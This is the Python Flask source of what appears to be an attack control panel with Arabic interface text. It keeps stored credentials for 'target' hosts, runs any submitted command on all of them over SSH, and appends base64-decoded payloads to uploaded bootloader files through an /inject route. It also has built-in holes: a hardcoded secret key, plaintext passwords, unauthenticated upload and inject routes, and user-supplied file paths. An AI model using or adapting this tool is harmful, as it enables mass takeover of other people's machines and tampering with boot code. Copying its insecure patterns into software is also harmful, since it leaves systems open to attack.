
from flask import Flask, request, redirect, url_for, render_template, session, send_file
import os, base64, sqlite3, paramiko
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'supersecret'
DB_PATH = 'users.db'
UPLOAD_FOLDER = 'k4log'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

def log_action(user, action, detail):
    conn = sqlite3.connect(DB_PATH)
    conn.execute("INSERT INTO logs (username, action, details, timestamp) VALUES (?, ?, ?, ?)",
                 (user, action, detail, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def execute_remote_command(ip, username, password, command):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, username=username, password=password, timeout=10)
        stdin, stdout, stderr = ssh.exec_command(command)
        result = stdout.read().decode() + stderr.read().decode()
        ssh.close()
        return result
    except Exception as e:
        return str(e)

@app.route('/')
def index():
    if not session.get('user'): return redirect('/login')
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        user = request.form['username']
        pw = request.form['password']
        conn = sqlite3.connect(DB_PATH)
        cur = conn.cursor()
        cur.execute("SELECT role FROM users WHERE username=? AND password=?", (user, pw))
        row = cur.fetchone()
        if row:
            session['user'], session['role'] = user, row[0]
            return redirect('/')
        return 'بيانات غير صحيحة'
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/login')

@app.route('/logs')
def show_logs():
    if session.get('role') != 'admin': return 'غير مصرح'
    conn = sqlite3.connect(DB_PATH)
    logs = conn.execute("SELECT username, action, details, timestamp FROM logs ORDER BY id DESC").fetchall()
    return render_template('logs.html', logs=logs)

@app.route('/remote', methods=['GET', 'POST'])
def remote():
    if not session.get('user'): return redirect('/login')
    if request.method == 'POST':
        command = request.form['command']
        conn = sqlite3.connect(DB_PATH)
        targets = conn.execute("SELECT ip, username, password FROM targets").fetchall()
        conn.close()
        results = {}
        for ip, user, pw in targets:
            out = execute_remote_command(ip, user, pw, command)
            results[ip] = out
            log_action(session['user'], 'تنفيذ أمر', f'{ip}: {command}')
        return render_template('remote_results.html', command=command, results=results)
    return render_template('remote_form.html')

@app.route('/upload', methods=['GET', 'POST'])
def upload():
    if request.method == 'POST':
        f = request.files['bootloader']
        filename = f.filename
        path = os.path.join(UPLOAD_FOLDER, filename)
        f.save(path)
        log_action(session['user'], 'رفع ملف بوتلودر', filename)
        return f'تم الحفظ: {filename}'
    return render_template('upload.html')

@app.route('/inject', methods=['POST'])
def inject():
    b64_payload = request.form['payload']
    bootloader_path = request.form['bootloader']
    name = os.path.basename(bootloader_path)
    output_path = os.path.join(UPLOAD_FOLDER, f'injected_{name}')

    try:
        with open(bootloader_path, 'ab') as f:
            f.write(base64.b64decode(b64_payload))
        log_action(session['user'], 'حقن بايلود', name)

        html_report = "<html><head><title>توثيق الحقن</title></head><body>"
        html_report += f"<h2>ملف بوتلودر</h2><p>{name}</p>"
        html_report += f"<h3>بايلود Base64</h3><pre>{b64_payload}</pre>"
        html_report += f"<p>تم إنشاء الملف بنجاح في: {output_path}</p>"
        html_report += "</body></html>"

        report_path = os.path.join(UPLOAD_FOLDER, f'{name}_report.html')
        with open(report_path, 'w', encoding='utf-8') as f:
            f.write(html_report)

        return send_file(report_path, as_attachment=True)

    except Exception as e:
        return str(e)

@app.route('/targets', methods=['GET', 'POST'])
def manage_targets():
    if not session.get('user') or session.get('role') != 'admin': return redirect('/login')
    conn = sqlite3.connect(DB_PATH)
    if request.method == 'POST':
        if 'delete_id' in request.form:
            conn.execute("DELETE FROM targets WHERE id=?", (request.form['delete_id'],))
            conn.commit()
            log_action(session['user'], 'حذف هدف', request.form['delete_id'])
        elif 'edit_id' in request.form:
            conn.execute("UPDATE targets SET ip=?, username=?, password=? WHERE id=?",
                         (request.form['edit_ip'], request.form['edit_username'], request.form['edit_password'], request.form['edit_id']))
            conn.commit()
            log_action(session['user'], 'تعديل هدف', request.form['edit_ip'])
        else:
            ip = request.form['ip']
            username = request.form['username']
            password = request.form['password']
            conn.execute("INSERT INTO targets (ip, username, password) VALUES (?, ?, ?)", (ip, username, password))
            conn.commit()
            log_action(session['user'], 'إضافة هدف', ip)
    targets = conn.execute("SELECT id, ip, username, password FROM targets").fetchall()
    conn.close()
    return render_template('targets.html', targets=targets)

if __name__ == '__main__':
    app.run(debug=True)
